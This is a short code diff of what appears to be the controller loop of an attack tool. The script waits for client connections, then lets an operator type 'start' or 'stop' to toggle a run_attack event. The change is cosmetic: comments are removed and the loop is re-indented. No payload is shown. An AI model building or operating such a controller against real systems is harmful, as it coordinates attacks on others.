@@ -84,18 +84,16 @@ if __name__ == "__main__":
     flask_thread.start()
 
     try:
-        # as long as the socket is running and the stop event is not set, keep accepting client connections
         while s and not stop_event.is_set():
-            # with active_connections_lock:
-                if active_connections > 0:
-                    sleep(1)
-                    command = input("> ")
-                    if command == "start":
-                        run_attack.set()
-                    elif command == "stop":
-                        run_attack.clear()
-                else:
-                    print("Waiting for connection...", end='\r', flush=True)
+            if active_connections > 0:
+                sleep(1)
+                command = input("> ")
+                if command == "start":
+                    run_attack.set()
+                elif command == "stop":
+                    run_attack.clear()
+            else:
+                print("Waiting for connection...", end='\r', flush=True)
                         
     except KeyboardInterrupt:
         # clean everything up once the user presses ctrl+c
